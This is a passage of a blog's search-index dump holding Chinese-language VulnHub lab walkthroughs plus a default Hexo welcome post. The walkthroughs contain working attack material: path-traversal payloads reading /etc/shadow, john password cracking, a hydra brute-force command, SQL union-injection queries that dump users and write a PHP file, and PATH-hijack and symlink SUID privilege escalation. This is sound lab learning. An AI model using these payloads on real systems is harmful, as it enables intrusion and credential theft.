class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>尝试data协议写马，失败<br>尝试包含ssh日志：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192251.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192258.png" alt="image.png"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/var/</span>log/auth.log<br>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/var/</span>log/secure<br></code></pre></td></tr></table></figure><blockquote><p>测试常见路径包含ssh日志getshell失败<br>尝试UA写马：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192321.png" alt="image.png"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/proc/</span>self/environ<br></code></pre></td></tr></table></figure><blockquote><p>又失败了，麻了，感觉可以放弃rce了<br>转回读文件，先读读web路径下的：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192331.png" alt="image.png"></p><blockquote><p>没有回显，可能是web路径错了，但是保险起见还是拿passwd试试：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192339.png" alt="image.png"></p><blockquote><p>可以确定了，好像不能使用伪协议，也难怪前面的测试全都没用<br>从web路径拿配置文件这条路也断了<br>只能转回最开始的passwd看看了：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192350.png" alt="image.png"></p><blockquote><p>密码也都隐藏了<br>根本没抱希望的包含了shadow文件，意外的发现居然配置错误，我们能访问：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192412.png" alt="image.png"></p><h3 id="shadow破解"><a href="#shadow破解" class="headerlink" title="shadow破解"></a>shadow破解</h3><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192504.png" alt="image.png"></p><blockquote><p>passwd和shadow存下来，unshadow一下，john破解：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192525.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192534.png" alt="image.png"></p><blockquote><p>解出了www-data的密码，先尝试登录www-data：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192544.png" alt="image.png"></p><blockquote><p>发现可能是有每次ssh后直接断开的自动脚本，之后提权可以注意</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192553.png" alt="image.png"></p><blockquote><p>w1r3s的破解也成功了，这里应该已经可以结束了，毕竟不可能把root也让解出来<br>尝试登录到w1r3s：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192615.png" alt="image.png"></p><blockquote><p>拿到立足点</p></blockquote><h3 id="john历史记录问题"><a href="#john历史记录问题" class="headerlink" title="john历史记录问题"></a>john历史记录问题</h3><blockquote><p>被 john 破解过的hash会被存储在john.pot中，再次破解会报错：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192625.png" alt="image.png"></p><blockquote><p>解决方法：</p><ol><li>删除&#x2F;root&#x2F;.john&#x2F;john.pot的内容</li><li>使用<code>john --show &lt;文件名&gt;</code>查看历史记录（推荐）</li></ol></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192633.png" alt="image.png"></p><h2 id="0x04-提权到root"><a href="#0x04-提权到root" class="headerlink" title="0x04 提权到root"></a>0x04 提权到root</h2><blockquote><p>刚准备开始提权坐牢，刚sudo枚举，发现是ALL：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192655.png" alt="image.png"></p><blockquote><p>拿到flag</p></blockquote><h2 id="0x05-反思补足"><a href="#0x05-反思补足" class="headerlink" title="0x05 反思补足"></a>0x05 反思补足</h2><blockquote><p>关于为什么测试的所有php伪协议均未成功：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192705.png" alt="image.png"></p><blockquote><p>该文件包含漏洞点已经写死了拼接的前半句路径，也就是为什么必须要目录穿越才能包含到的原因</p></blockquote><h2 id="0x06-看wp及视频后反思补足"><a href="#0x06-看wp及视频后反思补足" class="headerlink" title="0x06 看wp及视频后反思补足"></a>0x06 看wp及视频后反思补足</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><blockquote><ol><li>nmap全端口扫描时最好加入<code>-sT</code> 参数，以发送完整数据包</li></ol></blockquote><blockquote><ol start="2"><li>nmap -oA后，查看.nmap文件获得标准扫描结果</li></ol></blockquote><blockquote><ol start="3"><li>保险起见的udp扫描语句： <code>nmap -sU --top-ports 20 &lt;IP&gt;</code></li></ol></blockquote><blockquote><ol start="4"><li>所有路走不通时，必要时要考虑ipv6</li></ol></blockquote><h3 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h3><blockquote><ol><li>prompt关闭交互，即不用每次选确定</li></ol></blockquote><blockquote><ol start="2"><li>mget *.txt 批量下载文件</li></ol></blockquote><h3 id="杂"><a href="#杂" class="headerlink" title="杂"></a>杂</h3><blockquote><ol><li>ascii generator可生成ascii组成的logo<br><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192715.png" alt="image.png"></li></ol></blockquote><blockquote><ol start="2"><li><code>echo -n &#39;&lt;string&gt;&#39; | md5sum</code> 可以md5编码</li></ol></blockquote><blockquote><ol start="3"><li>当发现cms存在公开漏洞时，甚至可以github等地查看源码，看代码逻辑</li></ol></blockquote><blockquote><ol start="4"><li>虽然此靶机ssh密码很弱，可以hydra爆破ssh登录达成秒杀，但打靶过程尽量不选择爆破ssh</li></ol></blockquote><h2 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07 总结"></a>0x07 总结</h2><ol><li>端口扫描：ftp匿名登录、web wordpress、ssh、mysql</li><li>ftp匿名登录 ：无有效信息</li><li>web渗透：与wordpress相关页面均跳转localhost判断行不通；目录爆破出管理后台cms，存在文件包含公开漏洞，测试各文件包含姿势后，目录穿越拿到shadow文件，破解出ssh密钥</li><li>提权：sudo ALL直接提权</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>pentest</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub Nullbyte</title>
    <link href="/2024/03/24/Nullbyte/"/>
    <url>/2024/03/24/Nullbyte/</url>
    
    <content type="html"><![CDATA[<p>vulnhub Nullbyte walkthrough</p><h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h2><blockquote><p>主机发现：<br><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/1.png" alt="1"></p></blockquote><blockquote><p>全端口扫描：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/2.png" alt="1"></p><blockquote><p>详细信息扫描：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/3.png" alt="1"></p><blockquote><p>从rpcinfo感觉可能需要用到udp端口，多扫下udp：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/4.png" alt="1"></p><blockquote><p>只开了rpcbind和一个网络配置服务(zeroconf)，看来无需udp</p></blockquote><blockquote><p>接着脚本扫描：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/5.png" alt="1"></p><blockquote><p>枚举出了phpmyadmin和uploads页面，思路转到web渗透</p></blockquote><h2 id="0x02-web渗透"><a href="#0x02-web渗透" class="headerlink" title="0x02 web渗透"></a>0x02 web渗透</h2><blockquote><p>先打开目录爆破：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/6.png" alt="1"></p><blockquote><p>访问web服务：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/7.png" alt="1"></p><blockquote><p>只有一个图片，先下载，等待目录爆破结果：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/8.png" alt="1"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/9.png" alt="1"></p><blockquote><p>然而没什么新的有效信息，顺着访问phpmyadmin和uploads</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/10.png" alt="1"></p><blockquote><p>uploads说我们没有权限查看该目录的列表，但是推测可以通过&#x2F;uploads&#x2F;shell.php访问内容</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/11.png" alt="1"></p><blockquote><p>常规的登录界面，测试注入无果<br>线索只剩了main.gif，推测其中有信息隐写</p></blockquote><h3 id="exiftool查看图片信息"><a href="#exiftool查看图片信息" class="headerlink" title="exiftool查看图片信息"></a>exiftool查看图片信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">exiftool main.gif<br></code></pre></td></tr></table></figure><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/12.png" alt="1"></p><blockquote><p>在图片详细信息中就发现了一段文字kzMb5nVYJw<br>先保存到hint.txt</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/13.png" alt="1"></p><blockquote><p>尝试直接做phpmyadmin登录、ssh登录，全部失败<br>尝试抓包对uploads目录直接上传文件，失败<br>尝试gif图片隐写检查，失败</p></blockquote><blockquote><p>突然突发奇想，ctf比赛时为了防止目录爆破经常起奇怪的文件名，尝试将这段文字当作路径，居然还真成功了：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/14.png" alt="1"></p><blockquote><p>接着对着这个页面是一顿测注入，能测的都测了一遍，结果发现这页面不能执行sql语句，大概率就没连着数据库。就是一个单纯的验证key的界面，目前只能期望hydra爆破能走通了…</p></blockquote><h3 id="hydra爆破"><a href="#hydra爆破" class="headerlink" title="hydra爆破"></a>hydra爆破</h3><p>参考：[[入门打靶 (5台wp)#hydra密码爆破]]</p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/15.png" alt="1"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.130 -s 80 http-post-form <span class="hljs-string">&quot;/kzMb5nVYJw/index.php:key=^PASS^&amp;ps=^USER^:invalid key&quot;</span><br></code></pre></td></tr></table></figure><blockquote><p>根据抓取的数据包构造以上爆破语句，用rockyou成功爆破出key<br>登录：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/16.png" alt="1"></p><blockquote><p>登录后终于来到有查询功能的页面，抓包开测注入：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/17.png" alt="1"></p><blockquote><p>确认存在sql注入，且是”型，测万能语句“or 1#</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/18.png" alt="1"></p><blockquote><p>测出列数为3：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/19.png" alt="1"></p><blockquote><p>尝试写马：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/20.png" alt="1"></p><blockquote><p>失败，可能是路径猜测错误，也可能是没有权限<br>老老实实查内容：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/21.png" alt="1"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&quot; union select 6,7,group_concat(schema_name) from information_schema.schemata#<br></code></pre></td></tr></table></figure><blockquote><p>两个库最感兴趣：phpmyadmin、seth<br>先查phpmyadmin：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&quot; union select 6,7,group_concat(table_name) from information_schema.tables where table_schema=&#x27;phpmyadmin&#x27;#<br></code></pre></td></tr></table></figure><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/22.png" alt="1"></p><blockquote><p>说实话看到这个前缀就感觉不会有什么有用信息，但保险起见还是看看这两个和user相关的表：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&quot; union select 6,7,group_concat(column_name) from information_schema.columns where table_name=&#x27;pma_userconfig&#x27;#<br></code></pre></td></tr></table></figure><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/23.png" alt="1"></p><blockquote><p>果然是两张空表<br>转回seth库：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/24.png" alt="1"></p><blockquote><p>只有users表：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/25.png" alt="1"></p><blockquote><p>把数据全dump出来：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&quot; union select 6,7,group_concat(id,0x7c,user,0x7c,pass,0x7c,position,0x7c) from users#<br></code></pre></td></tr></table></figure><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/26.png" alt="1"></p><blockquote><p>得到一个ramses的凭据：<br>id：ramses<br>pass：YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE </p></blockquote><blockquote><p>解码：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/29.png" alt="1"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/30.png" alt="1"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/31.png" alt="1"></p><blockquote><p>成功解出最终凭据：<br>ramses@omega</p></blockquote><blockquote><p>尝试登录ssh、phpmyadmin：</p></blockquote><h2 id="0x03-获得立足点-ssh777端口"><a href="#0x03-获得立足点-ssh777端口" class="headerlink" title="0x03 获得立足点(ssh777端口)"></a>0x03 获得立足点(ssh777端口)</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -p 777 ramses@10.10.10.130<br></code></pre></td></tr></table></figure><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/32.png" alt="1"></p><blockquote><p>ssh登录成功，直接拿到了立足点，感觉无需再去尝试phpmyadmin的登录<br>开始做信息收集，先完善tty：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/33.png" alt="1"></p><blockquote><p>1、枚举home目录，都无写权限，放弃写公钥横向提权</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/34.png" alt="1"></p><blockquote><p>2、sudo枚举，没有任何结果</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/35.png" alt="1"></p><blockquote><p>3、自动任务枚举：</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/cron<br></code></pre></td></tr></table></figure><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/36.png" alt="1"></p><blockquote><p>4、s位枚举：</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/37.png" alt="1"></p><blockquote><p>一眼看到最特殊的&#x2F;var&#x2F;www&#x2F;backup&#x2F;procwatch，基本可以肯定它有问题<br>且gtfobins查询其余文件均无法s位提权</p></blockquote><h2 id="0x04-suid提权"><a href="#0x04-suid提权" class="headerlink" title="0x04 suid提权"></a>0x04 suid提权</h2><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/38.png" alt="1"></p><blockquote><p>很遗憾只有执行权限，先执行一次看看：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/39.png" alt="1"></p><blockquote><p>好像是执行了一次ps和sh的操作，并把ps的结果返回了？<br>感觉可以软链接提权：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/40.png" alt="1"></p><blockquote><p>因为不太熟悉这种提权方式，不知道为什么不太行…<br>突然想到可以劫持ps的环境变量，实现指向sh：</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> PATH=/tmp:<span class="hljs-variable">$PATH</span><br><span class="hljs-built_in">export</span> PATH=.:<span class="hljs-variable">$PATH</span><br></code></pre></td></tr></table></figure><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/41.png" alt="1"></p><blockquote><p>成功提权</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/42.png" alt="1"></p><blockquote><p>拿到凭证</p></blockquote><h2 id="0x05-自我反思补足"><a href="#0x05-自我反思补足" class="headerlink" title="0x05 自我反思补足"></a>0x05 自我反思补足</h2><h3 id="sql注入写马"><a href="#sql注入写马" class="headerlink" title="sql注入写马"></a>sql注入写马</h3><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/50.png" alt="1"></p><blockquote><p>当时还向&#x2F;tmp目录写做了尝试，打完后发现tmp的确实写进去了</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/43.png" alt="1"></p><blockquote><p>查看web根目录权限，发现是因为mysql用户并无该目录的写权限</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/44.png" alt="1"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/45.png" alt="1"></p><h3 id="软链接提权"><a href="#软链接提权" class="headerlink" title="软链接提权"></a>软链接提权</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -s &lt;target&gt; &lt;link_name&gt;<br></code></pre></td></tr></table></figure><blockquote><p>link_name为被劫持文件</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/46.png" alt="1"></p><blockquote><p>首先被劫持文件不能已经存在，否则报错<br>其次如果想要强制替换已存在的被劫持文件，参数可改为-sf，但也需要有写权限</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/47.png" alt="1"></p><blockquote><p>所以一般情况下，软链接提权要和环境变量劫持一同使用，如下：<br>(由于当前目录也有写权限，直接把当前目录写入环境变量即可)</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/48.png" alt="1"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -s /bin/sh ps<br></code></pre></td></tr></table></figure><blockquote><p>即在当前目录生成一个ps文件，并软链接指向&#x2F;bin&#x2F;sh</p></blockquote><blockquote><p>之后执行 <code>./procwatch</code> 触发root sh</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/49.png" alt="1"></p><h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><ol><li>端口扫描：80 web服务，777 ssh服务</li><li>web渗透：从图片详细信息得到隐藏路径，在sql注入失败的情况下对隐藏路径的登录key值进行爆破，成功进到连接数据库的查询页面；使用联合查询对其注入，得到用户信息，解码后为ssh凭据</li><li>提权：通过ssh获得立足点，枚举发现root身份的s位脚本文件，该脚本以root身份执行ps命令；通过劫持ps命令的执行文件，换为执行sh，获得root shell；此处亦可通过软链接劫持ps命令达到相同效果</li></ol><h2 id="0x07-看wp及视频后反思补足"><a href="#0x07-看wp及视频后反思补足" class="headerlink" title="0x07 看wp及视频后反思补足"></a>0x07 看wp及视频后反思补足</h2><blockquote><p>对于自我反思补足部分的勘误补足：<br>虽然&#x2F;var&#x2F;www&#x2F;html目录整体并无写入权限，但是存在uploads页面，不妨大胆推测此处可进行写操作，尝试对&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads写马：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/50.png" alt="1"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&quot; union select 6,7,&#x27;&lt;?php phpinfo();?&gt;&#x27; into outfile &#x27;/var/www/html/uploads/info.php&#x27;#<br></code></pre></td></tr></table></figure><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/51.png" alt="1"></p><blockquote><p>接着写马弹shell即可</p></blockquote><blockquote><p>反思：盲打阶段虽然考虑到了尝试写马，但当发现不能直接写到网站根目录时放弃过早，即使没有从uploads的名字联想到可以写数据，也应该根据目录爆破结果逐个尝试(intruder)</p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>pentest</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2024/03/22/hello-world/"/>
    <url>/2024/03/22/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
